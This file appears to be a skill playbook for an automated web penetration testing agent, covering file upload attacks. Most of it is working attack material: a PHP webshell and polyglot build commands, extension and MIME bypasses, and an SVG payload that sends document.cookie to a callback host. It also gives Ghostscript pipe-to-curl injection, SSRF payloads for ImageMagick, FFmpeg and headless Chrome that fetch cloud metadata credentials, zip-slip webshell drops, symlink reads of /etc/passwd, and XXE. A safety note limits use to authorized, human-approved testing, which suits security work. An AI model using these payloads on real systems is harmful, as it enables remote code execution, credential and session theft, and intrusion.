---
name: File Upload Testing
description: Defeat upload validation to plant executable content, proving impact when the uploaded file actually executes (RCE), runs script (stored XSS), or overwrites a target path.
tags: [web, file-upload, rce, owasp-a04]
recommended_tools: [http_repeater, http_request, nuclei_scan, ffuf_scan, execute_command]
vuln_classes: [file_upload]
domain: web
phase: exploitation
---
# File Upload Testing

Every upload (avatars, documents, imports, attachments) is a candidate for unrestricted upload. The proof bar is **execution / impact**, not merely a stored file: a `.php` that sits on disk but is never parsed is not RCE. Capture the file *running* (webshell output, OAST hit), script firing, or a sensitive path overwritten.

## Where to look
Avatar/profile image uploads, document/CSV/XML importers, ticket attachments, "import settings", logo/theme uploads, and any multipart `POST`. Note the **storage path** and whether it is web-reachable, and which handlers (PHP/JSP/ASP) the server runs.

## Detection -> confirmation -> escalation ladder
1. **Baseline.** Upload a legitimate image; learn the allowed types, the stored URL pattern, returned filename, and whether the response leaks the path.
2. **Dangerous extension.** Upload a minimal webshell (`<?php system($_GET["c"]); ?>`) as `shell.php` / `.phtml` / `.jsp` / `.aspx`.
3. **Locate + execute.** Request the stored file (use `ffuf_scan` for content discovery if the path is guessable) and trigger it: `GET /uploads/shell.php?c=id`. **Command output in the response = confirmed RCE.** For blind, use `?c=curl http://<token>.oast.example/` and confirm a token-correlated callback.
4. **Apply bypasses** (below) when validation blocks the direct upload, re-testing execution after each.
5. **Escalate.** Webshell -> reverse shell / read app secrets / pivot. SVG/HTML upload -> stored XSS against viewers. Path traversal in filename -> overwrite `.htaccess`, config, or other users' files.

## Bypass table (extension / MIME / magic-byte / polyglot)
| Technique | Example | Validation defeated |
|---|---|---|
| Extension variant | `shell.pHp`, `shell.php5`, `.phtml`, `.pht`, `.php3/4`, `.shtml` | Case sensitivity; alternate interpreters |
| Double extension | `shell.jpg.php` / `shell.php.jpg` | Only first/last segment checked |
| Null byte | `shell.php%00.jpg` | Old PHP (<5.3.4) truncates at `\x00` |
| Trailing char | `shell.php.`, `shell.php ` (space), `shell.php::$DATA` | Filesystem strips, validator does not |
| MIME spoof | PHP body + header `Content-Type: image/jpeg` | Trusts MIME header, not bytes |
| Magic-byte prefix | Prepend `GIF89a;` (or `\xFF\xD8\xFF` JPEG) before `<?php ...` | Header-only content sniffing |
| Polyglot | File that is valid JPEG **and** valid PHP | Processed as image, parsed as code |
| SVG w/ script | `<svg onload="alert(1)">` / embedded `<script>` | SVG served as image, JS executes -> stored XSS |
| `.htaccess` override | upload `.htaccess` with `AddType application/x-httpd-php .jpg`, then `shell.jpg` | Apache then runs `.jpg` as PHP |
| Path traversal / zip-slip | `../../../var/www/html/shell.php` in filename or archive entry | Unsanitized path on write/extract |

Magic-byte references for the prefix/polyglot trick — JPEG `FF D8 FF`, PNG `89 50 4E 47 0D 0A 1A 0A`, GIF `47 49 46 38` (`GIF89a`), ZIP/DOCX `50 4B 03 04`. Also: filename command injection (`; curl http://OAST/ ;` in filename if used in a shell call), and XXE via malicious XML inside a DOCX/ODT/SVG ZIP.

## Exact proof to capture
The **uploaded filename**, the **bypass used**, the **stored/served URL**, and the **execution proof**: webshell command output in the HTTP response, a token-correlated OAST callback from a blind webshell, the firing script for SVG/HTML XSS, or the overwritten target file. A stored-but-non-executing file is downgraded to info.

## Tooling
- Manual `http_repeater` / `http_request` — craft the multipart body precisely (filename, `Content-Type`, magic-byte prefix). Iterate the table; this is the primary tool for upload work.
- `ffuf_scan -w paths.txt -u https://t/uploads/FUZZ` to locate the stored file when the path is not returned.
- `execute_command` to build polyglots locally, e.g. `printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.gif.php`, then upload via repeater.
- `nuclei_scan` for known upload CVEs / exposed upload endpoints.

## Chaining
Webshell RCE -> reverse shell -> internal pivot / credential theft. `.htaccess` upload turns a benign-image upload into RCE on Apache. SVG stored XSS -> admin session theft. Zip-slip -> overwrite a cron/config file -> RCE.

## Safety / CWE
Uploading executable content is state-changing and HITL-gated; use a benign, token-scoped webshell, avoid destructive commands, and remove every test artifact (uploaded files, `.htaccess`) afterward. CWE-434.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Upload bypass battery (re-fetch the served URL — 'Accepted' is NEVER the finding)
Capture the SERVED response headers as the load-bearing artifact, then escalate.
```
polyglot:     GIF89a;\n<?php echo shell_exec($_GET['c']); ?>
ext rotation: shell.php.jpg  shell.phtml  shell.phar  shell.pHp  shell.php%00.png
config drop:  .htaccess -> AddType application/x-httpd-php .png   (+ paired benign-named PHP payload)
              .user.ini -> auto_prepend_file = "shell.png"
              web.config (IIS) handler mapping
SVG XSS:      <svg onload="alert(document.domain)"><script>fetch('https://{OAST}/'+document.cookie)</script></svg>
toolchain:    Ghostscript -> mark /OutputFile (%pipe%curl https://{OAST}/gs) currentdevice putdeviceprops
              ImageMagick MSL/MVG, ExifTool field injection
zip slip:     entry path  ../../../../../../var/www/html/shell.php
presigned S3: PUT bytes with Content-Type: text/html + Content-Disposition: inline against a URL signed for image/png
tus protocol: init image/png, PATCH PHP bytes, finalize with forged contentType metadata (late-finalize swap)
```
Commands:
```
curl -sk -X POST https://target/api/upload -F "file=@/tmp/shell.php;type=application/x-php"
curl -sk "https://<served-url>/shell.php?c=id"
jq -r '.fields["policy"]' /tmp/sign.json | base64 -d | jq .   # inspect presigned policy for missing key/Content-Type lock
```
Proof signal: re-fetched served URL returns command output (`uid=`) for shells, OOB callback for toolchain/SVG, or the served `Content-Type` honors the attacker value enabling inline render. A `200 Accepted` upload response is never proof — always re-fetch the served URL.

## Modern techniques & real-world CVEs (via recon-skills)

The high-value 2021-2024 shift: the vulnerable code is often *not* the upload validator but the **media/document processor** that runs server-side after the write. Any endpoint that thumbnails, transcodes, renders-to-PDF, or extracts an archive is a code-execution / SSRF sink even when the upload allowlist is airtight. Point every upload at a processor and test the processor, not just the extension filter.

### Image-processor SSRF & file read (ImageMagick / MVG / SVG)

ImageMagick fetches remote and local URLs *during processing*. Rename to `.jpg`/`.png` to defeat magic-byte checks — IM dispatches on content, not extension. The ImageTragick family (CVE-2016-3714) is still live on legacy farms; MVG/MSL and SVG `xlink:href` are the durable primitives.

```
# MVG — reads/exfils during render (rename to shell.jpg to pass the allowlist)
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
```
```xml
<!-- SVG SSRF: IM resolves xlink:href out-of-band -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://{OAST}/imagemagick-ssrf" width="200" height="200"/>
</svg>
```
Also probe ExifTool field injection and ImageMagick MSL. Confirmation is the token-correlated OAST hit (SSRF) or the fetched IMDS creds echoed back in the render.

### Codec memory-corruption CVEs (WebP / AVIF)

`CVE-2023-4863` — heap buffer overflow in libwebp's Huffman decode, reachable by any component that decodes a crafted WebP (Chrome, Electron, and many server-side image pipelines that link libwebp). Upload a malformed WebP to any thumbnailer; a crash/anomalous timing is the first signal, full RCE requires a target-tuned PoC (e.g. `mistymntncop/CVE-2023-4863`). Treat WebP/AVIF thumbnail endpoints as a distinct, modern attack surface, not "just another image".

### FFmpeg SSRF (HLS playlist / concat demuxer)

Video-processing endpoints let FFmpeg fetch attacker-referenced segments. Upload a `.m3u8` (or a video whose demuxer follows the reference):

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```
```
ffconcat version 1.0
file 'http://{OAST}/ffmpeg-ssrf'
```
The classic `GHOST`/`concat:` and `.m3u8` local-file read (`file:///etc/passwd` as a segment URI) still land on outdated FFmpeg builds; SSRF-to-IMDS is the modern win.

### Headless-Chrome / HTML→PDF SSRF & LFR

Invoice generators, report/screenshot exporters, and "export to PDF" features drive a headless browser over attacker HTML — an SSRF and local-file-read primitive that has nothing to do with file extensions.

```html
<!-- SSRF via CSS @import -->
<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>x</body></html>
<!-- SSRF / IMDS via iframe -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe>
<!-- Local file read -->
<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
<!-- JS exfil if the renderer isn't sandboxed -->
<script>fetch("http://{OAST}/chrome?d="+encodeURIComponent(document.documentElement.innerHTML))</script>
```
```
curl -s -X POST "https://$TARGET/api/generate-pdf" -H "Content-Type: application/json" \
  -d '{"html":"<iframe src=\"file:///etc/passwd\" width=1000 height=1000></iframe>"}'
```
Proof: the IMDS/`/etc/passwd` content rendered into the returned PDF, or the OAST callback. This is CWE-918, not CWE-434 — chains into cloud-credential theft.

### Archive extraction: zip-slip + symlink

Beyond path-traversal entries, a **symlink inside an archive** makes the extractor read a file *outside* the upload dir when the link target is later served/echoed — an arbitrary-read primitive distinct from zip-slip write.

```
# Zip-slip write (drop a shell into the webroot)
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink read: archive an innocent name pointing at a secret
ln -s /etc/passwd /tmp/sym/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym/            # or: tar --dereference for tar extractors
curl -s -X POST "https://$TARGET/api/import" -F "file=@/tmp/zipslip.zip"
```

### Office/DOCX as an XXE ZIP

Every DOCX/XLSX/PPTX/ODT is XML inside a `PK\x03\x04` ZIP, so every "upload-and-parse document" feature is a latent XXE. Inject a parameter-entity DTD into `word/document.xml` (or `[Content_Types].xml`) pointing at an attacker DTD for blind OOB file read (`/etc/passwd`, `web.config`). This is CWE-611 and chains to the `hunt-xxe` playbook — pair it with the SVG/MVG vectors above since both ride the same "media/doc parser fetches attacker URL" pattern.
